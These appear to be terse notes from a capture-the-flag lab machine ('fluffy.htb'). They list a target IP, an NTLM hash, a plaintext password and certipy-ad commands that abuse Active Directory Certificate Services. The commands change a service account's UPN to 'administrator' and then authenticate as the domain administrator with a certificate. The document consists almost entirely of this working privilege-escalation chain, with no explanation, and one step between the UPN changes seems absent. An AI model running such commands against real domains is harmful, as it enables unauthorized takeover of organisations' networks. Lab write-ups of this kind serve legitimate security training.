10.10.11.69

hash
33bd09dcd697600edf6b3a7af4875767

```bash
certipy-ad find -username ca_svc -hashes 33bd09dcd697600edf6b3a7af4875767 -dc-ip 10.10.11.69 -vulnerable   

certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69'  -upn 'administrator'  -user 'ca_svc' update


certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update


certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```